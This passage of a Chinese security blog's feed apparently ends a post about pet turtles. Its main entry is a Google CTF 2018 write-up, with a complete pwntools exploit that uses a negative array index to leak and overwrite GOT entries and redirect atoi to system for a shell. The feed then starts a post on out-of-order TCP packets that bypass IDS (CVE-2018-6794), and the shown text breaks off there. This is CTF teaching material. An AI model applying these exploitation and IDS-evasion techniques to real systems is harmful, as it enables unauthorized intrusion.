  &lt;li&gt;出水管有时候会有气泡，造成流量大幅下降，将出水管弄直或者放在水面以下，一般情况下不会出现盒子水溢出的问题。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/791/7.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;两只小龟几个月已经长了一厘米了，由 2.7cm 和 3.5 cm 长到了 3.5cm 和 4.5 cm。不过最近小龟有些生病，左眼睛肿的厉害，滴了左氧氟沙星之后会好很多，然后呼气有声音，貌似也有肺炎，不过吃饭和精神还不错，就暂时没有多加干预。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/791/8.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>virusdefender</name></author><category term="生活" /><summary type="html">前几个月妹子买了两只小龟，是密西西比红耳龟，国内一般称巴西龟，淘宝上小苗子一般几块钱一只。我之后又买了一些草金鱼，一开始是 20 多条，除去陆续死掉的和看样子不大行喂了龟的，现在还剩一半，已经一段时间没有死过了。</summary></entry><entry><title type="html">二进制安全之栈溢出（十一）</title><link href="https://strcpy.me/index.php/archives/790/" rel="alternate" type="text/html" title="二进制安全之栈溢出（十一）" /><published>2018-11-09T12:46:07+00:00</published><updated>2018-11-09T12:46:07+00:00</updated><id>https://strcpy.me/index.php/archives/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA(%E5%8D%81%E4%B8%80)</id><content type="html" xml:base="https://strcpy.me/index.php/archives/790/">&lt;p&gt;本文是 plt 和 got 表相关的漏洞利用实例，是 &lt;a href=&quot;https://github.com/BOAKGP/CTF-Writeups/tree/master/Google%20CTF%202018%20Quals%20Beginners%20Quest/Fridge%20todo%20list&quot;&gt;Google CTF&lt;/a&gt; 中的一道题，题目给了源码和 binary。&lt;/p&gt;

&lt;p&gt;通过阅读代码，可以发现&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-clike&quot;&gt;int idx = read_int();
if (idx &amp;gt; TODO_COUNT) {
    puts(OUT_OF_BOUNDS_MESSAGE);
    return;
}
printf(&quot;What's your TODO? &quot;);
fflush(stdout);
read_line(&amp;amp;todos[idx*TODO_LENGTH], TODO_LENGTH);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这里虽然检查了 &lt;code class=&quot;highlighter-rouge&quot;&gt;idx&lt;/code&gt; 最大不能超过某个范围，但是没有检查小于零的情况，所以如果构造小于零的 &lt;code class=&quot;highlighter-rouge&quot;&gt;idx&lt;/code&gt;，就可以读取比 &lt;code class=&quot;highlighter-rouge&quot;&gt;todos&lt;/code&gt; 数组地址还小的位置的内存了，同理，在 &lt;code class=&quot;highlighter-rouge&quot;&gt;write_all&lt;/code&gt; 函数中，也可以任意的去写这个位置的内存。&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;todos&lt;/code&gt; 是一个全局变量，所以它的内存地址是确定的，是在 bss 段。因为 &lt;code class=&quot;highlighter-rouge&quot;&gt;todos&lt;/code&gt; 的索引会乘以 &lt;code class=&quot;highlighter-rouge&quot;&gt;TODO_LENGTH&lt;/code&gt;，所以内存的读取是跳跃的，每次都相差 48 个字节。&lt;/p&gt;

&lt;p&gt;使用 gdb 调试，&lt;code class=&quot;highlighter-rouge&quot;&gt;set follow-fork-mode parent&lt;/code&gt; 然后 &lt;code class=&quot;highlighter-rouge&quot;&gt;b main&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;p &amp;amp;todos&lt;/code&gt; 可以看到内存地址。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda$ p &amp;amp;todos
$1 = (&amp;lt;data variable, no debug info&amp;gt; *) 0x555555757140 &amp;lt;todos&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在 IDA 中，也可以看到 &lt;code class=&quot;highlighter-rouge&quot;&gt;todos&lt;/code&gt; 和 &lt;code class=&quot;highlighter-rouge&quot;&gt;got&lt;/code&gt; 表距离也非常近，写一个小程序算一下&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://storage.virusdefender.net/blog/images/790/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x203140&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;结合 IDA 的结果和计算输出的结果，可以标记出来一些有用的数据&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x203140 -&amp;gt; todos
0x203110
0x2030e0
0x2030b0
         0x203088（非整数倍） -&amp;gt; atoi
0x203080 -&amp;gt; open
0x203050 -&amp;gt; strncat
0x203020 -&amp;gt; write
0x202ff0
0x202fc0
0x202f90
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;比如先读一下 &lt;code class=&quot;highlighter-rouge&quot;&gt;write&lt;/code&gt; 的地址&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[-------------------------------------code-------------------------------------]
   0x555555554900 &amp;lt;puts@plt&amp;gt;:	jmp    QWORD PTR [rip+0x202712]        # 0x555555757018
   0x555555554906 &amp;lt;puts@plt+6&amp;gt;:	push   0x0
   0x55555555490b &amp;lt;puts@plt+11&amp;gt;:	jmp    0x5555555548f0
=&amp;gt; 0x555555554910 &amp;lt;write@plt&amp;gt;:	jmp    QWORD PTR [rip+0x20270a]        # 0x555555757020
 | 0x555555554916 &amp;lt;write@plt+6&amp;gt;:	push   0x1
 | 0x55555555491b &amp;lt;write@plt+11&amp;gt;:	jmp    0x5555555548f0
 | 0x555555554920 &amp;lt;strlen@plt&amp;gt;:	jmp    QWORD PTR [rip+0x202702]        # 0x555555757028
 | 0x555555554926 &amp;lt;strlen@plt+6&amp;gt;:	push   0x2
 |-&amp;gt;   0x555555554916 &amp;lt;write@plt+6&amp;gt;:	push   0x1
       0x55555555491b &amp;lt;write@plt+11&amp;gt;:	jmp    0x5555555548f0
       0x555555554920 &amp;lt;strlen@plt&amp;gt;:	jmp    QWORD PTR [rip+0x202702]        # 0x555555757028
       0x555555554926 &amp;lt;strlen@plt+6&amp;gt;:	push   0x2
                                                                  JUMP is taken
[------------------------------------stack-------------------------------------]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;重新画一下数据分布图&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x555555757140 -&amp;gt; todos
0x555555757110
0x5555557570e0
0x5555557570b0
0x555555757080
0x555555757050
0x555555757020 =&amp;gt; 0x555555554916 -&amp;gt; write@plt+6
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;由以前的知识就知道 &lt;code class=&quot;highlighter-rouge&quot;&gt;0x555555757020&lt;/code&gt; 就是 &lt;code class=&quot;highlighter-rouge&quot;&gt;write&lt;/code&gt; 的 got 表的地址，减去刚才已知的 &lt;code class=&quot;highlighter-rouge&quot;&gt;todos&lt;/code&gt; 的位置，正好是 &lt;code class=&quot;highlighter-rouge&quot;&gt;(0x555555757020 - 0x555555757140) / 48 == -6&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;可以先构造一个读取 &lt;code class=&quot;highlighter-rouge&quot;&gt;write&lt;/code&gt; 的 got 表地址 exp&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./todo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;admin&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;read?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;-6&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Hi admin,&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;splitlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;write_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;':'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ljust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;write_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;write_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;其中 &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;Q&lt;/code&gt; 是指定按照小端序读取 8 个字节作为一个数字。因为这时候 write 函数还没有被解析，所以 got 表中的 &lt;code class=&quot;highlighter-rouge&quot;&gt;write&lt;/code&gt; 还是指向 &lt;code class=&quot;highlighter-rouge&quot;&gt;write@plt+6&lt;/code&gt; 的。&lt;/p&gt;

&lt;p&gt;剩下的步骤就简单多了，在 &lt;code class=&quot;highlighter-rouge&quot;&gt;store_todo&lt;/code&gt; 函数中，可以将我们的输入写入 got 表的位置，所以应该是将 &lt;code class=&quot;highlighter-rouge&quot;&gt;system@plt&lt;/code&gt; 的地址写入接下来要运行的参数可控的函数的 got 表的位置。发现 &lt;code class=&quot;highlighter-rouge&quot;&gt;atoi&lt;/code&gt; 函数是一个选择，函数的偏移是确定的，&lt;code class=&quot;highlighter-rouge&quot;&gt;system@plt&lt;/code&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;write@plt+6&lt;/code&gt; 也就是 &lt;code class=&quot;highlighter-rouge&quot;&gt;0x555555554940 - 0x555555554916 = 0x2a&lt;/code&gt;（&lt;code class=&quot;highlighter-rouge&quot;&gt;atoi@plt&lt;/code&gt; 的地址可以使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;info addr atoi@plt&lt;/code&gt; 获取，是在偏移 -4 再加 8 个字节）。&lt;/p&gt;

&lt;p&gt;完整 exp 如下&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./todo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;admin&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;read?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;-6&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Hi admin,&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;splitlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;write_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;':'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ljust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;write_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;write_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;3&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;entry?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;-4&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;TODO?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;AAAAAAAA&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;write_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;参考&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;https://hackso.me/google-ctf-beginners-quest-part-2/&lt;/li&gt;
&lt;/ul&gt;</content><author><name>virusdefender</name></author><category term="安全" /><category term="CTF" /><summary type="html">本文是 plt 和 got 表相关的漏洞利用实例，是 Google CTF 中的一道题，题目给了源码和 binary。</summary></entry><entry><title type="html">不按顺序来的 TCP 包</title><link href="https://strcpy.me/index.php/archives/789/" rel="alternate" type="text/html" title="不按顺序来的 TCP 包" /><published>2018-06-16T18:18:18+00:00</published><updated>2018-06-16T18:18:18+00:00</updated><id>https://strcpy.me/index.php/archives/%E4%B8%8D%E6%8C%89%E9%A1%BA%E5%BA%8F%E6%9D%A5%E7%9A%84%20TCP%20%E5%8C%85</id><content type="html" xml:base="https://strcpy.me/index.php/archives/789/">&lt;p&gt;关于 TCP 建立连接和断开连接的流程，很多人都能大致说出来，可以参考&lt;a href=&quot;http://www.cnblogs.com/vamei/archive/2012/12/16/2812188.html&quot;&gt;协议森林&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;正常的数据传输是在三次握手结束之后进行的，但是如果打破了这个流程，数据传输仍然可能成功，而部分防火墙 IDS 就可能被绕过，下面的两个例子来自 https://github.com/kirillwow/ids_bypass。&lt;/p&gt;

&lt;h2 id=&quot;cve-2018-6794&quot;&gt;CVE-2018-6794&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# 客户端开始三次握手 发送 SYN
Client    -&amp;gt;  [SYN] [Seq=0 Ack=0]           -&amp;gt;  Evil Server
# 服务器端正常的响应了 SYN-ACK
